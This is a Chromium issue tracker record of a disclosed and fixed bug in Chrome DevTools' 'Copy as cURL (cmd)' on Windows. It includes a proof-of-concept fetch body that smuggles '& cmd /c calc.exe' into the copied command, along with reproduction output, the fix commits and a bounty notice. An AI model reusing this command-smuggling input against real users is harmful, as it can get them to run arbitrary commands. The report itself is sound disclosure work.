# Chrome devTools "Copy as cURL (cmd)" Allows Arbitrary Code Execution in CMD

| Field | Value |
|-------|-------|
| **Issue ID** | [352651673](https://issues.chromium.org/issues/352651673) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Windows |
| **Reporter** | fa...@gmail.com |
| **Assignee** | da...@google.com |
| **Created** | 2024-07-12 |
| **Bounty** | $1,000.00 |

## Description

Security Bug

---

#### VULNERABILITY DETAILS

It is possible to construct a request that, when copied as a cURL command for cmd on Windows, will automatically execute arbitrary commands when pasted into `cmd.exe`.

**Proof of Concept:**

```
<script>
    fetch("https://example.com/postit", {
        credentials: "omit",
        headers: {
            "Accept-Language": "en-US",
            "Content-Type": "text/plain",
        },
        body: "query=evil\n\n & cmd /c calc.exe \n\n",
        method: "POST",
    });
</script>

```

In the above example, the body `"body": "query=evil\n\n & cmd /c calc.exe \n\n"` is not properly filtered. As a result, using special JavaScript characters, malicious code can break the intended execution flow and run arbitrary commands. For instance, the command `"cmd /c calc.exe"` will be executed on the computer.

This demonstrates the potential for significant security risks if input is not properly sanitized, allowing an attacker to execute arbitrary code on the target system.

#### VERSION

Chrome Version: 126.0.6478.127 (Official Build) (64-bit) + [stable]

Operating System: Windows 11

#### REPRODUCTION CASE

1. Download the `curl.html` file below or create one using the above-mentioned proof-of-concept HTML code.
2. Using the above webpage open developer tools' network section, copy the request as `Copy as cURL (cmd)` and paste it into a Windows command prompt. Run the curl command just coppied using `Copy as cURL (cmd)` to see that the calculator app opens.

**Expected:**

- The cURL command copied for the cmd application should be properly filtered to prevent arbitrary code execution.

**Actual:**

- Arbitrary code is executed when the cURL command copied from the code is run in cmd.

#### CREDIT INFORMATION

Reporter credit: Shaheen Fazim

## Attachments

- [demo.mp4](attachments/demo.mp4) (video/mp4, 4.6 MB)
- [curl.html](attachments/curl.html) (text/html, 306 B)

## Timeline

### fa...@gmail.com (2024-07-12)

I discovered this issue while reading about a similar report in Mozilla: <https://bugzilla.mozilla.org/show_bug.cgi?id=1777800>.

### ja...@chromium.org (2024-07-13)

This seems like unexpected behavior. I was able to get this to work on Windows using the "Copy as cURL (cmd)" option.

I pasted it into cmd.exe and after pressing enter twice it ran calc.exe.

The output text is:

```
curl "https://localhost:8888/postit" ^
More?   -H ^"sec-ch-ua: ^\^"Not/A)Brand^\^";v=^\^"8^\^", ^\^"Chromium^\^";v=^\^"126^\^", ^\^"Google Chrome^\^";v=^\^"126^\^"^" ^
More?   -H "Content-Type: text/plain" ^
More?   -H "Referer: http://localhost:8888/" ^
More?   -H "Accept-Language: en-US" ^
More?   -H "sec-ch-ua-mobile: ?0" ^
More?   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" ^
More?   -H ^"sec-ch-ua-platform: ^\^"Windows^\^"^" ^
More?   --data-raw ^"query=evil^
More?
More? ^
More?
More?  & cmd /c calc.exe ^
More?
More? ^
More?
More? ^"

```

I was not able to reproduce this on Linux, so I'll set the OS as Windows.

This seems similar to [issue 41362860](https://issues.chromium.org/issues/41362860) so I'll start with that assignee.

### ja...@chromium.org (2024-07-13)

Here's the output on Linux for reference:

```
curl 'https://localhost:8888/postit' \
  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"' \
  -H 'Content-Type: text/plain' \
  -H 'Referer: http://localhost:8888/' \
  -H 'Accept-Language: en-US' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Linux"' \
  --data-raw $'query=evil\n\n & cmd /c calc.exe \n\n'

```

### ja...@chromium.org (2024-07-13)

Setting found in to M126 since I reproduced this on Stable.

### ja...@chromium.org (2024-07-13)

This is another one that's similar, [issue 40051166](https://issues.chromium.org/issues/40051166)

### ja...@chromium.org (2024-07-13)

Setting as Severity Low following [issue 40051166](https://issues.chromium.org/issues/40051166).

### pe...@google.com (2024-07-13)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### fa...@gmail.com (2024-07-24)

Friendly ping.

### bm...@google.com (2024-07-25)

Danil, can you take a look please?

### fa...@gmail.com (2024-08-28)

Friendly ping.

### fa...@gmail.com (2024-09-09)

Hi Assignee, can you share any update? Thanks

### ap...@google.com (2024-09-10)

Project: chromium/src
Branch: main

commit f25f85bdf14563ef0c9bc90d65cc4b7cd461857b
Author: Danil Somsikov <dsv@chromium.org>
Date:   Tue Sep 10 14:53:01 2024

    Disable layout test to land crrev.com/c/5850610
    
    Bug: 352651673
    Change-Id: Ie02e93a78057674e60cf74ff883a6828ce13516e
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5851392
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Commit-Queue: Danil Somsikov <dsv@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1353339}

M       third_party/blink/web_tests/TestExpectations

https://chromium-review.googlesource.com/5851392


### ap...@google.com (2024-09-10)

Project: devtools/devtools-frontend
Branch: main

commit f44471114ad6bae8971da24526b5cd5cddba8e83
Author: Danil Somsikov <dsv@chromium.org>
Date:   Tue Sep 10 12:22:30 2024

    Fix curl escaping for cmd when ampersand follows a newline.
    
    Currently, generated command allows arbitrary code execution, due to incomplete escaping: an ampersand in multi-line strings is not escaped.
    
    This is fixed by always escaping outer quotes, thus disabling cmd double quote escaping, and escaping ampersand with a caret.
    
    Double quote escaping is very convenient and easy to read, but it doesn't support multi-line strings. Thus we need to be able to escape individual characters with caret, which was added in https://codereview.chromium.org/2182213006/.
    
    That CL only escaped outer double quotes around multi-line strings for better readability. However this lead to carets being interpreted as a literal character in single-line strings. This caused crrev.com/2514441 which disabled caret escaping of ampersand even for multi-line strings with escaped quotes and crrev.com/c/5126051 which enabled escaping quotes for the single-line strings with special characters (including ampersand, which was still exempt from caret escaping:).
    
    As this is all rather complicated and hard to follow, this CL sacrifices the generated command readability in favor of correctness and simplicity (relatively speaking) of the generator code, leaving only one mode of escaping.
    
    Bug: 352651673
    Change-Id: I4c25b165c6ba7b3eae3891179c8e371fc16c91f2
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/5850610
    Commit-Queue: Danil Somsikov <dsv@chromium.org>
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>

M       front_end/panels/network/NetworkLogView.test.ts
M       front_end/panels/network/NetworkLogView.ts

https://chromium-review.googlesource.com/5850610


### ap...@google.com (2024-09-11)

Project: chromium/src
Branch: main

commit efceba6b1cbe88af2078585a1e2919372812a1c5
Author: Danil Somsikov <dsv@chromium.org>
Date:   Wed Sep 11 12:32:00 2024

    Update and re-enable layout test after crrev.com/c/5850610
    
    Bug: 352651673
    Change-Id: I979f2496523c4a5a1301f90efd395eeb43c2b82f
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5851066
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>
    Commit-Queue: Danil Somsikov <dsv@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1353891}

M       third_party/blink/web_tests/TestExpectations
M       third_party/blink/web_tests/http/tests/devtools/copy-network-request-expected.txt

https://chromium-review.googlesource.com/5851066


### sp...@google.com (2024-09-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact local privilege escalation


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-09-19)

Congratulations on another one, Shaheen! Given the high user interaction and convincing a user to engage in this way, we consider this a highly mitigated / lower impact issue.
We do appreciate your efforts and reporting this issue to us.

### pe...@google.com (2024-12-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/352651673)*
